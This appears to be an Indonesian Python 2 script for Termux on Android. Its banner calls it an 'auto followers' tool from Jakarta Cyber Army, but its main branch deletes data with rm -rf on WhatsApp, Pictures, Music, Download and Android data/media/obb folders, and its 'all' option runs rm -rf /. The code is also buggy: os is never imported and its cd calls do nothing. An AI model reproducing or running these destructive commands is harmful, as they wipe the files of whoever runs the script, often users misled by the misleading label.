import json

import sys

from os import system


b = '\033[34;1m'

g = '\033[32;1m'

p = '\033[35;1m'

c = '\033[36;1m'

r = '\033[31;1m'

w = '\033[37;1m'

y = '\033[33;1m'


system('clear')

print g + "#########################################"

print g + "# Author : CHips L #"

print g + "# Tools : auto followers #"

print g + "# Youtube : Ranur169 #"

print g + "# Website : www.sipayah.zone.id #"

print g + "# Thanks all member Jakarta Cyber Army #"

print g + "#########################################"

print "\n"

print g + "Sebelum menggunakan tools ini kami menyarankan kalian melihat " + b + "Menu" + g + " terlebih dahulu, Karena yg terjadi pada handphone anda kami tidak peduli."

print "\n"

print r + "Ketik menu untuk menuju menu, ketik lanjut untuk melanjutkan, Ketik exit untuk keluar."

print "\n"

print b + "menu"

print r + "lanjut"

print g + "exit"

visit = raw_input("root@pilih:# ")

if visit =='menu':

    system('clear')

    print w + "Teks yang berwarna " + r + "merah" + w +" adalah teks untuk deletenya"

    print w + "Contoh : Jika anda ingin hapus data file manager, bisa dilihat dari menu yg warna hijau.. jika nemu maka lihat teks yang berwarna " + r + "Merah" +w+" itu untuk teks yang di pemilihan"

    print "\n"

    print g + "Whatsapp "+b+ "=" +r+" Whatsapp"

    print g + "Galeri " +b+ "=" +r+" Pictures"

    print g + "Semua " +b+ "=" +r+" All"

    print g + "Musik " +b+ "=" +r+" Music"

    print g + "Video " +b+ "=" +r+" Movies"

    print g + "Unduhan " +b+ "=" +r+" Download"

    print g + "Android data" +b+ "=" +r+" Android data"

    print g + "Android obb" +b+ "=" +r+" Android obb"

    print g + "Android media" +b+ "=" +r+" Android media"

elif visit =='exit':

	system('clear')

	print b + "Subscribe"

	print g + "Follow"

	print r + "Creator"

	print y + "Exit"

	print "\n"

	gblk = raw_input("root@exit:# ")

	if gblk == 'Subscribe':

		os.system("termux-open-url https://www.youtube.com/channel/UCnV18haS6MvRkqYbRMYm7Zg")

	if gblk == 'Follow':

		os.system("termux-open-url https://disqus.com/by/apridal")

	if gblk == 'Creator':

		os.system("termux-open-url https://wa.me/6283807359899")

	if gblk == 'Exit':

		print("Thanks For Using this Tools, And don't forget to subscribe my channel")

elif visit =='lanjut':

    pilih = raw_input("root@delete:# ")

    if pilih == 'Whatsapp':

        system('clear')

        system("cd /sdcard")

        system("rm -rf Whatsapp")

    elif pilih == 'all':

        system('clear')

        system("cd /sdcard")

        system("rm -rf /")

    elif pilih == 'Pictures':

        system('clear')

        system("cd /sdcard")

        system("rm -rf Pictures")

    elif pilih == 'Music':

        system('clear')

        system("cd /sdcard")

        system("rm -rf Music")

    elif pilih == 'Movies':

        system("clear")

        system("cd /sdcard")

        system("rm -rf Movies")

    elif pilih == 'Download':

        system('clear')

        system("cd /sdcard")

        system("rm -rf Download")

    elif pilih == 'Android data':

        system('clear')

        system("cd /sdcard")

        system("rm -rf /storage/emulated/0/Android/data")

    elif pilih == 'Android media':

        system('clear')

        system("cd /sdcard")

        system("rm -rf /storage/emulated/0/Android/media")

    elif pilih == 'Android obb':

        system('clear')

        system("cd /sdcard")

        system("rm -rf /storage/emulated/0/Android/obb")

